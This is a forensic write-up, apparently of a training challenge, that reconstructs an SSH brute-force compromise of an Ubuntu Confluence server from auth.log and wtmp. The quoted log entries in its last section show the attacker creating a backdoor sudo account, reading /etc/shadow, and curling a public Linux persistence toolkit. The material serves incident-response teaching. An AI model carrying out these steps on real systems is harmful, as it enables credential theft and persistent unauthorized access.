Brutus

DFIR investigation of a compromised Confluence server. Reconstruct an SSH brute-force, credential theft, and backdoor account creation from auth.log and wtmp.

Scenario

A Confluence server was compromised. We're handed two host-based authentication artifacts from the affected Ubuntu box and asked to reconstruct the intrusion: how the attacker got in, what account they used, how they established persistence, and what they did with their access.

  • auth.log — plaintext PAM/sshd log; records SSH login attempts (success and failure), account/group changes, and sudo execution.
  • wtmp — binary accounting file recording login/logout sessions (who, from where, which TTY, and when). Parsed with the provided utmp.py.

Used together: auth.log tells you what authentication events happened; wtmp confirms which became real interactive sessions and how long they lasted.

1. Establish a Baseline

Reading the head of auth.log, the host is ip-172-31-35-28 (an AWS EC2 instance) running cron jobs as a confluence service account. Legitimate administrative access comes from 203.101.190.9 — confirmed by an Accepted password for root at 06:19:54. This is the known-good admin IP.

2. Identify the Brute Force

Filtering for failed authentications surfaces a flood of attempts from a single source:

grep "Failed password" auth.log
Mar  6 06:31:33 ... Failed password for invalid user admin from 65.2.161.68 ...
Mar  6 06:31:33 ... Failed password for backup from 65.2.161.68 ...
Mar  6 06:31:37 ... Failed password for invalid user server_adm from 65.2.161.68 ...
Mar  6 06:31:38 ... Failed password for invalid user svc_account from 65.2.161.68 ...

Dozens of failures within a couple of seconds, cycling through usernames from 65.2.161.68. Rapid timestamps and rotating usernames are the tell of an automated credential-stuffing burst.

3. Find the Successful Compromise

grep "Accepted password" auth.log
Mar  6 06:19:54 ... Accepted password for root from 203.101.190.9 port 42825   # legit admin
Mar  6 06:31:40 ... Accepted password for root from 65.2.161.68  port 34782    # brute force succeeds
Mar  6 06:32:44 ... Accepted password for root from 65.2.161.68  port 53184
Mar  6 06:37:34 ... Accepted password for cyberjunkie from 65.2.161.68 port 43260

The brute force succeeds against root at 06:31:40 — just seven seconds after the burst began. A second root login follows at 06:32:44, and later a login as cyberjunkie (a previously unseen user) appears — the first sign of persistence.

4. Correlate Sessions in wtmp

python3 utmp.py wtmp

Relevant records for the attacker IP:

TTYUserHostTimeNotes
pts/1root65.2.161.682024/03/06 06:32:45Interactive attacker session
pts/1(DEAD)—2024/03/06 06:37:24Session ends
pts/1cyberjunkie65.2.161.682024/03/06 06:37:35Backdoor account logs in

The root session on pts/1 (06:32:45 → 06:37:24) is the hands-on-keyboard window. Duration: 4 minutes 39 seconds.

5. Tie Sessions to systemd Session Numbers

grep "New session" auth.log
New session 34 of user root.          # 06:31:40 - first brute-force hit
New session 37 of user root.          # 06:32:44 - the interactive session
New session 49 of user cyberjunkie.   # 06:37:34

Session 37 is the interactive root session aligned with the wtmp pts/1 record and immediately preceding the account-creation activity.

6. Reconstruct Persistence and Post-Exploitation

grep -E "useradd|new user|new group|usermod|passwd" auth.log
grep -E "sudo:.*COMMAND" auth.log
06:34:18  groupadd    new group: name=cyberjunkie, GID=1002
06:34:18  useradd     new user: name=cyberjunkie, UID=1002, shell=/bin/bash, from=/dev/pts/1
06:34:26  passwd      password changed for cyberjunkie
06:35:15  usermod     add 'cyberjunkie' to group 'sudo'
06:37:57  sudo        cyberjunkie : COMMAND=/usr/bin/cat /etc/shadow
06:39:38  sudo        cyberjunkie : COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

The attacker created a backdoor account cyberjunkie, gave it a password, and escalated it into the sudo group — establishing durable, privileged access that survives even if the root password is rotated. They then dumped /etc/shadow (credential access) and fetched linper.sh — a public Linux persistence/privilege-escalation toolkit.
